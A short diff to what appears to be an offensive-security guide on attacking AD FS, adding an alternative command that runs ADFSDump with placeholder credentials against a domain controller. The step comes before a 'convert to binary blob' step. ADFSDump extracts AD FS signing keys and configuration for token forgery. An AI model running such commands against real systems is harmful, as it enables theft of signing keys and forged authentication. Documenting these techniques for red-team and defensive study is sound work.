@@ -80,6 +80,11 @@ c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccou
  => issue(store = "Active Directory", types = ("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn", "http://schemas.xmlsoap.org/claims/CommonName"), query = ";userPrincipalName,sAMAccountName;{0}", param = c.Value);
 ```
 
+```console
+# Alternative if error
+.\ADFSDump.exe /user:<USER> /password:<PASSWORD> /domain:<DOMAIN> /server:<DC_IP>
+```
+
 <small>*Ref: [ADFSDump](https://github.com/mandiant/ADFSDump)*</small>
 
 #### 2. Convert to binary blob
